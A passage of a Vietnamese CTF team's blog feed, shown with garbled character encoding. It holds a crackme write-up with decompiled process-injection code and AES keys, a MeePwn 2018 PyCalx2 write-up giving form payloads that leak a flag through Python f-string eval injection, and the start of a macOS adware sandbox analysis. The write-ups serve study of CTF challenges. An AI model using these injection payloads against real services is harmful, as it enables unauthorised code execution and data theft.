        v13 = WriteProcessMemory(hProcess, (char *)lpBaseAddress + 4, &amp;arr1[j], 1u, 0);
        if ( !v13 )
            exit(0);
        lpBaseAddress = (char *)lpBaseAddress + 4;
    }
    CloseHandle(hProcess);
    hObject = OpenProcess(dwDesiredAccess, 0, dword_4F502C[2]);
    if ( !hObject )
        exit(0);
    dwSize = 43632;
    v10 = VirtualAllocEx(hObject, 0, 0xAA70u, 0x1000u, 0x40u);
    if ( !v10 )
        exit(0);
    v6 = v10;
    lpBuffer = byte_4FFAA8;
    v11 = WriteProcessMemory(hObject, &amp;BaseAddress, &amp;v10, 4u, 0);
    if ( !v11 )
        exit(0);
    for ( k = 0; k &lt; dwSize; ++k )
        byte_4FFAA8[k] ^= 0x66u;
    v11 = WriteProcessMemory(hObject, v6, lpBuffer, dwSize, 0);
    if ( !v11 )
        exit(0);
    lpStartAddress = (LPTHREAD_START_ROUTINE)v10;
    v4 = CreateRemoteThread(hObject, 0, 0, (LPTHREAD_START_ROUTINE)v10, lpParameter, 0, 0);
    if ( !v4 )
        exit(0);
    CloseHandle(hObject);
    return ReleaseSemaphore(*(&amp;hSemaphore + (_DWORD)lpParameter), 1, 0);
}</pre>
<p>MÃ¬nh sáº½ khÃ´ng nÃ³i chi tiáº¿t vá» viá»‡c binary dÃ¹ng <code>Semaphore</code> vÃ  <code>CreateRemoteThread</code> nhÆ° tháº¿ nÃ o Ä‘á»ƒ Ä‘iá»u khiá»ƒn luá»“ng thá»±c thi cho Ä‘Ãºng, vÃ¬ nÃ³i tháº­t nÃ³ loáº±ng ngoáº±ng vÃ  mÃ¬nh cÅ©ng khÃ´ng cá»‘ note láº¡i. Tuy nhiÃªn, Ä‘á»ƒ lÃ m Ä‘Æ°á»£c bÃ i thÃ¬ váº«n cáº§n biáº¿t chÆ°Æ¡ng trÃ¬nh lÃ m nhá»¯ng gÃ¬, nÃªn sau khi F8 tá»‰ má»‰ má»™t vÃ i lÆ°á»£t inject code Ä‘áº§u tiÃªn, nháº­n tháº¥y cÃ³ sá»± tÆ°Æ¡ng Ä‘á»“ng nhÆ° Ä‘Ã£ nÃ³i khi nÃ£y, mÃ¬nh Ä‘áº©y nhanh tiáº¿n Ä‘á»™ báº±ng cÃ¡ch Ä‘áº·t breakpoint á»Ÿ hÃ m <code>kernel32_CreateRemoteThread</code>(trong cáº£ 3 process) vÃ  cá»© tháº¿ cháº¡y, má»—i khi dá»«ng á»Ÿ breakpoint, mÃ¬nh dá»±a vÃ o tham sá»‘ <code>lpStartAddress</code> Ä‘á»ƒ biáº¿t Ä‘á»‹a chá»‰ pháº§n code chuáº©n bá»‹ Ä‘Æ°á»£c thá»±c thi á»Ÿ Ä‘Ã¢u, rá»“i má»Ÿ xem code Ä‘Ã³ nÃ³ lÃ m gÃ¬ (Ä‘Ã¡ng láº½ cáº§n pháº£i xem tham sá»‘ <code>hProcess</code>Â Ä‘á»ƒ biáº¿t lÃ  process nÃ o ná»¯a, nhÆ°ng mÃ¬nh lÆ°á»i nÃªn cá»© Alt+Tab láº§n lÆ°á»£t 3 cá»­a sá»• IDA Ä‘á»ƒ thá»­ thÃ´i). CÅ©ng cÃ³ má»™t chÃºt anti-decompile nhÆ°ng cÃ³ thá»ƒ fix báº±ng tay Ä‘Æ°á»£c. NhÃ¬n chung chÆ°Æ¡ng trÃ¬nh hoáº¡t Ä‘á»™ng nhÆ° tháº¿ nÃ y:</p>
<p>CÃ¡c Ä‘oáº¡n code giá»‘ng nhau vá» cáº¥u trÃºc, cÃ³ sáºµn hai máº£ng 16 kÃ½ tá»± lÃ Â <code>arr1</code>Â vÃ  <code>arr2</code>, trong Ä‘Ã³ máº£ng <code>arr1</code>Â luÃ´n lÃ  <code>abcdabcdabcdabcd</code>. Khi Ä‘Æ°á»£c thá»±c thi báº±ng hÃ m <code>CreateRemoteThread</code>, code sáº½ xá»­ lÃ½ 2 máº£ng <code>arr1</code>Â vÃ  <code>arr2</code> (báº±ng má»™t trong cÃ¡c thao tÃ¡c xor,Â <a href="https://www.felixcloutier.com/x86/AESENC.html" target="_blank" rel="noopener">aesenc</a>,Â <a href="https://www.felixcloutier.com/x86/AESENCLAST.html" target="_blank" rel="noopener">aesenclast</a> hoáº·c so sÃ¡nh), sau Ä‘Ã³, ghi Ä‘Ã¨ outputÂ Â vÃ o máº£ng <code>arr1</code>Â cá»§a Ä‘oáº¡n code thá»±c thi sau Ä‘Ã³ thÃ´ng qua hÃ m <code>WriteProcessMemory</code>Â (Ä‘oáº¡n code nÃ y vá»‘n cÅ©ng Ä‘Ã£ thá»±c thi rá»“i, nhÆ°ng Ä‘ang bá»‹ dá»«ng bá»Ÿi Semaphore). BÃªn cáº¡nh viá»‡c xá»­ lÃ½ input thÃ¬ má»—i thread cÅ©ng kiÃªm thÃªm viá»‡c ghi code cho cÃ¡c thread sau. Äá»ƒ dá»… hÃ¬nh dung (vÃ¬ náº¿u nÃ³i chÃ­nh xÃ¡c thÃ¬ cÃ¡c Ä‘oáº¡n code khÃ´ng cháº¡y má»™t máº¡ch tá»« Ä‘áº§u Ä‘áº¿n cuá»‘i mÃ  sáº½ bá»‹ giÃ¡n Ä‘oáº¡n bá»Ÿi Semaphore), cÃ³ thá»ƒ tÆ°á»Ÿng tÆ°á»£ng vá»›i Ä‘áº§u vÃ o lÃ  input mÃ  ta nháº­p, chÆ°Æ¡ng trÃ¬nh cho nÃ³ Ä‘i qua má»™t dÃ¢y chuyá»n sáº£n xuáº¥t, á»Ÿ má»—i bÆ°á»›c giÃ¡ trá»‹ cá»§a input láº¡i bá»‹ thay Ä‘á»•i má»™t tÃ­, xong Ä‘Æ°á»£c Ä‘áº©y sang bÆ°á»›c tiáº¿p theo. CÃ³ táº¥t cáº£ lÃ  1 bÆ°á»›c xor, 9 bÆ°á»›c <code>aesenc</code>, 1 bÆ°á»›c <code>aesenclast</code>Â (<a href="https://www.cosic.esat.kuleuven.be/ecrypt/AESday/slides/Use_of_the_AES_Instruction_Set.pdf" target="_blank" rel="noopener">AES128</a>) vÃ  cuá»‘i cÃ¹ng lÃ  1 bÆ°á»›c so sÃ¡nh (Ä‘á»ƒ hiá»‡n thÃ´ng bÃ¡o <code>Correct!</code> hoáº·c <code>Try Again!</code>). ChÃºng ta cÃ³ toÃ n bá»™ hardcoded key Ä‘Æ°á»£c dÃ¹ng trong cÃ¡c bÆ°á»›c nÃ y vÃ  táº¥t nhiÃªn lÃ  cáº£ giÃ¡ trá»‹ so sÃ¡nh cuá»‘i cÃ¹ng.</p>
<pre>xor_key = '6A156D0B9DF0C234748AD44F5084A07F'

aes_keys = [
'609D4731B5DD367EEF997AD8495C4523',
'FAECDBBB93B23AEF68E4BE6D2FF66B4C',
'3E43953C69D073672297D1B1A361FD4A',
'45337E3CF07F2DAC33443B75482AC546',
'4DF0EC1A3D04A9DBF5D5081A80709306',
'BAF0AB1FAC2F5881F125B159F979DE03',
'34AFFF57513A0FEC8BA0E65F8C986078',
'2EEBCF4605AE3D94BA8CCCF44CA11D4C',
'74F9C5427F7A6EE2B11F2CC21804B8F7',
'0A98631D8469820807CA31F71D335629',
]

target = '68CEDFDD586C37E4C4E1ACB4097F97A4'</pre>
<p>Äáº¿n Ä‘Ã¢y thÃ¬ pháº§n RE Ä‘Ã£ xong, pháº§n cÃ²n láº¡i lÃ  Crypto, mÃ¬nh há»i má»™t chuyÃªn gia máº­t mÃ£ Ä‘áº§u ngÃ nh cá»§a team vÃ  nháº­n láº¡i flag vÃ i phÃºt sau Ä‘Ã³.</p>
<p>P.S: CÃ³ má»™t bÃ­ áº©n xung quanh challenge nÃ y, nhÆ°ng bÃ¢y giá» cáº£m giÃ¡c tá»™i lá»—i vá»›i Linh Ka khiáº¿n mÃ¬nh khÃ´ng táº­p trung lÃ m Ä‘Æ°á»£c viá»‡c gÃ¬ cáº£. Náº¿u sau nÃ y cÃ³ thá»i gian tÃ¬m hiá»ƒu thÃªm thÃ¬ mÃ¬nh sáº½ bá»• sung vÃ o bÃ i viáº¿t sau.</p>
<p>QuÃªn máº¥t, cÃ¡ nhÃ¢n mÃ¬nh Ä‘Ã¡nh giÃ¡ Ä‘Ã¢y lÃ  má»™t Ä‘á» máº¥t khÃ´ng Ã­t thá»i gian Ä‘á»ƒ xÃ¢y dá»±ng, nÃªn kudos to ngÆ°á»i ra Ä‘á»!</p>
]]></content:encoded>
									<post-id xmlns="com-wordpress:feed-additions:1">751</post-id>	</item>
		<item>
		<title>MEEPWN CTF 2018 - PyCalx2</title>
		<link>https://babyphd.net/2018/07/17/meepwn-ctf-2018-pycalx2/</link>
				<pubDate>Tue, 17 Jul 2018 13:39:52 +0000</pubDate>
		<dc:creator><![CDATA[yeuchimse]]></dc:creator>
				<category><![CDATA[web]]></category>

		<guid isPermaLink="false">https://babyphd.net/?p=734</guid>
				<description><![CDATA[BÃ i nÃ y code giá»‘ng há»‡t bÃ i 1, khÃ¡c má»—i cÃ¡i lÃ  biáº¿n opÂ bÃ¢y giá» cÅ©ng khÃ´ng Ä‘Æ°á»£c chá»©a cÃ¡c kÃ½ tá»± trong máº£ng ['(',')','[',']','\'','"']Â ná»¯a, do Ä‘Ã³ khÃ´ng thá»ƒ dÃ¹ng kiá»ƒu +'Â Ä‘á»ƒ break giÃ¡ trá»‹ cá»§a value2Â ra ngoÃ i chuá»—i. NÃ³i cÃ¡ch khÃ¡c, value1Â vÃ  value2Â Ä‘á»u sáº½ chá»‰ lÃ  cÃ¡c string Ä‘Æ¡n thuáº§n. MÃ¬nh search thá»­ thÃ¬ tháº¥y &#8230; <a href="https://babyphd.net/2018/07/17/meepwn-ctf-2018-pycalx2/" class="more-link">Continue reading <span class="screen-reader-text">MEEPWN CTF 2018 - PyCalx2</span> <span class="meta-nav">&#8594;</span></a>]]></description>
								<content:encoded><![CDATA[<p><a href="https://i1.wp.com/babyphd.net/wp-content/uploads/2018/07/2018-07-17_19-46-56.png?ssl=1"><img data-attachment-id="735" data-permalink="https://babyphd.net/2018/07/17/meepwn-ctf-2018-pycalx2/2018-07-17_19-46-56/" data-orig-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2018/07/2018-07-17_19-46-56.png?fit=818%2C331&amp;ssl=1" data-orig-size="818,331" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="2018-07-17_19-46-56" data-image-description="" data-medium-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2018/07/2018-07-17_19-46-56.png?fit=300%2C121&amp;ssl=1" data-large-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2018/07/2018-07-17_19-46-56.png?fit=604%2C244&amp;ssl=1" class="aligncenter wp-image-735 size-full" src="https://i1.wp.com/babyphd.net/wp-content/uploads/2018/07/2018-07-17_19-46-56.png?resize=604%2C244&#038;ssl=1" alt="" width="604" height="244" srcset="https://i1.wp.com/babyphd.net/wp-content/uploads/2018/07/2018-07-17_19-46-56.png?w=818&amp;ssl=1 818w, https://i1.wp.com/babyphd.net/wp-content/uploads/2018/07/2018-07-17_19-46-56.png?resize=300%2C121&amp;ssl=1 300w, https://i1.wp.com/babyphd.net/wp-content/uploads/2018/07/2018-07-17_19-46-56.png?resize=768%2C311&amp;ssl=1 768w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
<p>BÃ i nÃ y code giá»‘ng há»‡t bÃ i 1, khÃ¡c má»—i cÃ¡i lÃ  biáº¿n <code>op</code>Â bÃ¢y giá» cÅ©ng khÃ´ng Ä‘Æ°á»£c chá»©a cÃ¡c kÃ½ tá»± trong máº£ng <code>['(',')','[',']','\'','"']</code>Â ná»¯a, do Ä‘Ã³ khÃ´ng thá»ƒ dÃ¹ng kiá»ƒu <code>+'</code>Â Ä‘á»ƒ break giÃ¡ trá»‹ cá»§a <code>value2</code>Â ra ngoÃ i chuá»—i. NÃ³i cÃ¡ch khÃ¡c, <code>value1</code>Â vÃ  <code>value2</code>Â Ä‘á»u sáº½ chá»‰ lÃ  cÃ¡c string Ä‘Æ¡n thuáº§n.<span id="more-734"></span></p>
<p>MÃ¬nh search thá»­ thÃ¬ tháº¥y Python3.6 cÃ³ má»™t tÃ­nh nÄƒng má»›i lÃ  <a href="https://docs.python.org/3/whatsnew/3.6.html" target="_blank" rel="noopener">Formatted string literals</a>, hoáº¡t Ä‘á»™ng nhÆ° sau:</p>
<pre>Python 3.6.1 (v3.6.1:69c0db5, Mar 21 2017, 17:54:52) [MSC v.1900 32 bit (Intel)] on win32
Type "help", "copyright", "credits" or "license" for more information.
&gt;&gt;&gt; a = 'xxx'
&gt;&gt;&gt; f'{a}'
'xxx'
&gt;&gt;&gt; f'{0 if 2 &gt; 3 else 1}'
'1'</pre>
<p>CÃ³ thá»ƒ tháº¥y Ä‘Ã¢y gáº§n nhÆ° lÃ  hÆ°á»›ng duy nháº¥t cá»§a bÃ i nÃ y.</p>
<p>Náº¿u <code>op = +f</code>, chuá»—i Ä‘Æ°á»£c eval sáº½ cÃ³ dáº¡ngÂ Â <span style="color: #222222; font-family: monospace, serif;"><span style="font-size: 14px; background-color: #e9ebec;"><code>calc_eval = 'value1'+f'value2'</code></span></span>. TÆ°Æ¡ng tá»± bÃ i 1, chÃºng ta muá»‘n dá»±a vÃ o output cá»§a hÃ m eval Ä‘á»ƒ leak flag, mÃ  output chá»‰ Ä‘Æ°á»£c in ra khi káº¿t quáº£ eval lÃ  sá»‘, lÃ  <code>'True'</code>Â hoáº·c <code>'False'</code>. NhÆ° tháº¿ dáº«n Ä‘áº¿n má»™t sá»‘ suy luáº­n sau:</p>
<ol>
<li>VÃ¬ <code>value1</code>Â kiá»ƒu gÃ¬ cÅ©ng chá»‰ lÃ  chuá»—i Ä‘Æ¡n thuáº§n, nÃªn sau khi eval nÃ³ sáº½ váº«n lÃ  chÃ­nh nÃ³. Máº·t khÃ¡c,Â <code>value1</code>Â khÃ´ng thá»ƒ lÃ  sá»‘ vÃ¬ náº¿u tháº¿,Â <code>value2</code>Â cÅ©ng pháº£i lÃ  sá»‘, cháº³ng cÃ³ tÃ¡c dá»¥ng gÃ¬. Váº­y, <code>value1</code>Â lÃ  chá»¯.</li>
<li>Náº¿u <code>value1</code>Â lÃ  chá»¯, thÃ¬ káº¿t quáº£ sau khi eval khÃ´ng thá»ƒ lÃ  sá»‘, nghÄ©a lÃ  chÃºng ta chá»‰ cÃ³ thá»ƒ tháº¥y Ä‘Æ°á»£c output náº¿u eval ra <code>True</code>Â hoáº·c <code>False</code>, thÃ¬Â <code>value1</code>Â cáº§n lÃ  má»™t pháº§n cá»§a <code>True</code>Â hoáº·c <code>False</code>Â (vÃ­ dá»¥ <code>Tr</code>Â hoáº·c <code>Fals</code>, Ä‘á»ƒ sau khi káº¿t há»£p vá»›i <code>value2</code>Â sáº½ ra giÃ¡ trá»‹ hoÃ n chá»‰nh). Vá» lÃ½ thuyáº¿t chÃºng ta cÃ³ thá»ƒ Ä‘á»ƒ <code>value2</code>Â tráº£ vá» Ä‘áº§y Ä‘á»§ chuá»—i <code>True</code>Â hoáº·c <code>False</code>, tuy nhiÃªn Ä‘á» bÃ i khÃ´ng cho phÃ©p <code>value1</code>Â lÃ  má»™t chuá»—i rá»—ng.</li>
<li>Dáº¡ng biá»ƒu thá»©c <code>f'{0 if 2 &gt; 3 else 1}'</code>Â cÃ³ thá»ƒ cho phÃ©p chÃºng ta leak flag giá»‘ng bÃ i 1, kiá»ƒu nhÆ° <code>f'{'e' if 'MeePwn' in FLAG else 'x'}'</code>. Vá»›i biá»ƒu thá»©c nÃ y, káº¿t há»£p vá»›i <code>value1 = Tru</code>Â thÃ¬ khi nháº­n Ä‘Æ°á»£c output lÃ  <code>True</code>, chÃºng ta káº¿t luáº­n Ä‘Æ°á»£c FLAG cÃ³ chá»©a chuá»—i <code>MeePwn</code>, vÃ  ngÆ°á»£c láº¡i.</li>
</ol>
<p>Táº¥t nhiÃªn á»Ÿ trÃªn chá»‰ lÃ  vÃ­ dá»¥ thÃ´i, vÃ¬ thá»±c táº¿ Ä‘á» bÃ i khÃ´ng cho dÃ¹ngÂ <code>'</code>Â trong <code>value2</code>. Sau má»™t há»“i ngá»“i nhÃ¬n mÃ n hÃ¬nh, mÃ¬nh nghÄ© ra má»™t hÆ°á»›ng khÃ¡ lÃ  cáº§n cÃ¹ bÃ¹ thÃ´ng minh.</p>
<pre>Content-Disposition: form-data; name="value1"

Tru
----------954427002
Content-Disposition: form-data; name="op"

+f
----------954427002
Content-Disposition: form-data; name="value2"

{source % 101 if source % 77 in FLAG else x}
----------954427002
Content-Disposition: form-data; name="source"

%c</pre>
<p>Output nháº­n Ä‘Æ°á»£c lÃ  <code>True</code>Â (há»£p lÃ½ vÃ¬ FLAG cÃ³ chá»©a chá»¯ <code>M</code>Â trong tá»« <code>MeePwn</code>).</p>
<p>NhÆ°ng check tá»«ng kÃ½ tá»± thÃ¬ chá»‰ cÃ³ thá»ƒ tÃ¬m Ä‘Æ°á»£c charset cá»§a FLAG mÃ  thÃ´i, mÃ¬nh cáº§n check Ä‘Æ°á»£c nhiá»u hÆ¡n. Do <code>value2</code>Â dÃ i tá»‘i Ä‘a 64 kÃ½ tá»±, mÃ¬nh cá»‘ gáº¯ng xÃ³a bá»›t máº¥y khoáº£ng tráº¯ng, Ä‘Æ°á»£c nhÆ° sau:</p>
<pre>Content-Disposition: form-data; name="value1"

Tru
----------954427002
Content-Disposition: form-data; name="op"

+f
----------954427002
Content-Disposition: form-data; name="value2"

{source%101 if source%77+source%101+source%101 in FLAG else x}
----------954427002
Content-Disposition: form-data; name="source"

%c</pre>
<p>3 kÃ½ tá»± má»™t lÃºc lÃ  khÃ¡ á»•n, Ä‘á»§ Ä‘á»ƒ mÃ¬nh tÃ¬m Ä‘Æ°á»£c Ä‘áº¿n <code>MeePwnCTF{python3.6[_strikes_backk</code>. Sau Ä‘Ã³ thÃ¬ phÃ¡t sinh má»™t váº¥n Ä‘á», Ä‘Ã³ lÃ  vá»›i 2 kÃ½ tá»± <code>kk</code>, mÃ¬nh tÃ¬m Ä‘Æ°á»£c 2 chuá»—i thá»a mÃ£n lÃ  <code>kkk</code>Â vÃ  <code>kk}</code>. CÃ¡i sau cháº¯c lÃ  pháº§n káº¿t cá»§a FLAG rá»“i, nhÆ°ng cÃ¡i Ä‘áº§u thÃ¬ khÃ¡ lÃ  báº¿ táº¯c, do khÃ´ng biáº¿t cáº§n chÃ­nh xÃ¡c bao nhiÃªu chá»¯ <code>k</code>. MÃ¬nh cÃ³ thá»ƒ thá»­ submit dáº§n luÃ´n trÃªn scoreboard, nhÆ°ng ngáº¡i nhá»¡ bá»‹ ban thÃ¬ mang tá»™i vá»›i team, cÃ²n náº¿u clone má»™t nick má»›i Ä‘á»ƒ thá»­ thÃ¬ láº¡i lÃ m tÄƒng sá»‘ Ä‘á»™i giáº£i Ä‘Æ°á»£c, Ä‘iá»ƒm cá»§a mÃ¬nh cÅ©ng bá»‹ áº£nh hÆ°á»Ÿng. Äá»u khÃ´ng váº¹n toÃ n.</p>
<p>Tá»± nhiÃªn mÃ¬nh nghÄ© Ä‘áº¿n má»™t hÆ°á»›ng, máº·c dÃ¹ Ä‘oÃ¡n lÃ  khÃ´ng Ä‘Æ°á»£c nhÆ°ng váº«n quyáº¿t Ä‘á»‹nh thá»­:</p>
<pre>&gt;&gt;&gt; '%c' % 49 * 3
'111'</pre>
<p>Ká»³ diá»‡u. MÃ¬nh cá»© sá»£ lÃ  nÃ³ sáº½ thÃ nh <code>'%c' % 147</code>.</p>
<p>FLAG: <code>MeePwnCTF{python3.6[_strikes_backkkkkkkkkkkk)}</code></p>
<p>P.S: BÃ i nÃ y Jinmo lÃ m theo má»™t cÃ¡ch thá»±c sá»± ráº¥t Ä‘áº¹p vÃ  Ä‘Ã¡ng Ä‘Æ°á»£c ngá»£i ca, má»i ngÆ°á»i cÃ³ thá»ƒ Ä‘á»c táº¡i <a href="https://github.com/Jinmo/ctfs/blob/master/2018/meepwn/pycalx_both.py" target="_blank" rel="noopener">Ä‘Ã¢y</a>. Kudos to him!</p>
<p>&nbsp;</p>
]]></content:encoded>
									<post-id xmlns="com-wordpress:feed-additions:1">734</post-id>	</item>
		<item>
		<title>What is SafeFinder/OperatorMac campaign?</title>
		<link>https://babyphd.net/2017/08/10/wtf-is-safefinderoperatormac-campaign/</link>
				<pubDate>Thu, 10 Aug 2017 15:35:08 +0000</pubDate>
		<dc:creator><![CDATA[phamus]]></dc:creator>
				<category><![CDATA[chuymich]]></category>
		<category><![CDATA[forensic]]></category>
		<category><![CDATA[Uncategorized]]></category>
		<category><![CDATA[vietnamese]]></category>
		<category><![CDATA[malware]]></category>
		<category><![CDATA[Mughthesec]]></category>
		<category><![CDATA[OperatorMac]]></category>

		<guid isPermaLink="false">https://babyphd.net/?p=687</guid>
				<description><![CDATA[&#160; A new variant of adware was just discovered yesterday. Itâ€™s going viral on Twitter and other media, since they use valid Apple developer certificate to sign all packed samples. Iâ€™m quite overbusy these days but it got my interest when seeing the name stated in that certificate: â€œQuoc Thinhâ€, quite a unique Vietnamese name. &#8230; <a href="https://babyphd.net/2017/08/10/wtf-is-safefinderoperatormac-campaign/" class="more-link">Continue reading <span class="screen-reader-text">What is SafeFinder/OperatorMac campaign?</span> <span class="meta-nav">&#8594;</span></a>]]></description>
								<content:encoded><![CDATA[<p>&nbsp;</p>
<p>A new variant of adware was just discovered yesterday. Itâ€™s going viral on Twitter and other media, since they use valid Apple developer certificate to sign all packed samples. Iâ€™m quite overbusy these days but it got my interest when seeing the name stated in that certificate: â€œQuoc Thinhâ€, quite a unique Vietnamese name. So why not take a break from desperate thesis, toss adware in my lame automated MacOS analysis framework and see what our â€˜countrymanâ€™ doing?</p>
<p><span id="more-687"></span>The sample was first noticed by <em>Gavriel State</em>â€ on Aug 7, then <em>Thomas A Reed</em> â€“ the Mac malware boss hunter from Malwarebytes - confirmed it relates to OperatorMac on the next day. I think you all know the famous Mac free security toolsâ€™ author: <em>Patrick Wardle</em>, wrote an amazing report on <a href="https://objective-see.com/blog/blog_0x20.html">objective-see.com</a> in Aug 9. So Iâ€™m not going too deep in reverse engineering - static analysis, just throw in my Grey-cuckoo framework and grab results. In case somebody doesnâ€™t know, itâ€™s my thesis project and and soon to be released right after my judgment day - defense (hopefully).</p>
<p>From Patrickâ€™s report we understand itâ€™s an adware which installs lots of crabs. By default, cuckoo sandbox timeout is 120 sec. Letâ€™s extend it a bit, 300 sec (5 min) would be enough.</p>
<p id="jztOQbU"><a href="https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c71a4b4bf1.png?ssl=1"><img data-attachment-id="692" data-permalink="https://babyphd.net/2017/08/10/wtf-is-safefinderoperatormac-campaign/img_598c71a4b4bf1/" data-orig-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c71a4b4bf1.png?fit=1892%2C1159&amp;ssl=1" data-orig-size="1892,1159" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="img_598c71a4b4bf1" data-image-description="" data-medium-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c71a4b4bf1.png?fit=300%2C184&amp;ssl=1" data-large-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c71a4b4bf1.png?fit=604%2C370&amp;ssl=1" class="alignnone size-full wp-image-692 " src="https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c71a4b4bf1.png?w=604&#038;ssl=1" alt="" srcset="https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c71a4b4bf1.png?w=1892&amp;ssl=1 1892w, https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c71a4b4bf1.png?resize=300%2C184&amp;ssl=1 300w, https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c71a4b4bf1.png?resize=768%2C470&amp;ssl=1 768w, https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c71a4b4bf1.png?resize=1024%2C627&amp;ssl=1 1024w, https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c71a4b4bf1.png?w=1208&amp;ssl=1 1208w, https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c71a4b4bf1.png?w=1812&amp;ssl=1 1812w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
<p>First result we got, that Apple developer ID â€œQuoc Thinhâ€, and he got his certificate revoked from Apple today by the way <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f604.png" alt="ğŸ˜„" class="wp-smiley" style="height: 1em; max-height: 1em;" />.</p>
<p><code>spctl -avv "Mughthesec-Player(dmg).dmg"<br />
Mughthesec-Player(dmg).dmg: <strong>CSSMERR_TP_CERT_REVOKED</strong></code></p>
<p>From captured screenshots, we can see what this adware apparently executes: Install Adobe flash and offer you a bunch of PUA (potential unwanted applications) â€“ Booking, Advanced Mac Cleaner, SafeFinder Safari extension, and AdBlock (in some relevant samples that will be discussed later).</p>
<p><a href="https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/Webp.net-gifmaker.gif?ssl=1"><img data-attachment-id="696" data-permalink="https://babyphd.net/2017/08/10/wtf-is-safefinderoperatormac-campaign/webp-net-gifmaker/" data-orig-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/Webp.net-gifmaker.gif?fit=1390%2C869&amp;ssl=1" data-orig-size="1390,869" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Webp.net-gifmaker" data-image-description="" data-medium-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/Webp.net-gifmaker.gif?fit=300%2C188&amp;ssl=1" data-large-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/Webp.net-gifmaker.gif?fit=604%2C378&amp;ssl=1" class="alignnone wp-image-696" src="https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/Webp.net-gifmaker.gif?resize=571%2C358&#038;ssl=1" alt="" width="571" height="358" srcset="https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/Webp.net-gifmaker.gif?resize=300%2C188&amp;ssl=1 300w, https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/Webp.net-gifmaker.gif?resize=768%2C480&amp;ssl=1 768w, https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/Webp.net-gifmaker.gif?resize=1024%2C640&amp;ssl=1 1024w, https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/Webp.net-gifmaker.gif?w=1208&amp;ssl=1 1208w" sizes="(max-width: 571px) 100vw, 571px" data-recalc-dims="1" /></a></p>
<p>Behavioral analysis shows the packed DMG sample invoked a â€˜macâ€™ binary, thereafter â€˜Mughthesecâ€™ with a persistence â€˜Iâ€™ binary. Screenshots below already included other analysis variant of this campaign.</p>
<p><a href="https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c722bde0a9.png?ssl=1"><img data-attachment-id="693" data-permalink="https://babyphd.net/2017/08/10/wtf-is-safefinderoperatormac-campaign/img_598c722bde0a9/" data-orig-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c722bde0a9.png?fit=726%2C863&amp;ssl=1" data-orig-size="726,863" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="img_598c722bde0a9" data-image-description="" data-medium-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c722bde0a9.png?fit=252%2C300&amp;ssl=1" data-large-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c722bde0a9.png?fit=604%2C718&amp;ssl=1" class="alignnone wp-image-693 " src="https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c722bde0a9.png?resize=275%2C327&#038;ssl=1" alt="" width="275" height="327" srcset="https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c722bde0a9.png?w=726&amp;ssl=1 726w, 